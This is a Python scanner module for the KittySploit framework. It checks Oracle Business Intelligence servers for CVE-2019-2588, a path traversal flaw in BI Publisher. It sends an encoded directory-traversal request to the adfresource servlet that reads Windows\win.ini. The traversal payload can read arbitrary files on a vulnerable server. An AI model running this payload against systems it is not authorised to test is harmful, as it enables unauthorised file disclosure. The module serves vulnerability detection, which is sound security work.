#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Oracle Business Intelligence versions 11."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Oracle Business Intelligence - Path Traversal Detection',
        'description': 'Oracle Business Intelligence versions 11.1.1.9.0, 12.2.1.3.0 and 12.2.1.4.0 are vulnerable to path traversal in the BI Publisher (formerly XML Publisher) component of Oracle Fusion Middleware (subcomponent: BI Publisher Security).',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'oracle', 'lfi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'http://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-2588',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/Elsfa7-110/kenzer-templates',
            'https://github.com/lnick2023/nicenice',
        ],
        'cve': 'CVE-2019-2588',
    }

    def run(self):
        r = self.http_request(method="GET", path='/xmlpserver/servlet/adfresource?format=aaaaaaaaaaaaaaa&documentId=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('for 16-bit app support',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='medium',
                reason="Oracle Business Intelligence - Path Traversal detected",
                path='/xmlpserver/servlet/adfresource?format=aaaaaaaaaaaaaaa&documentId=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini',
            )
            return True
        return False

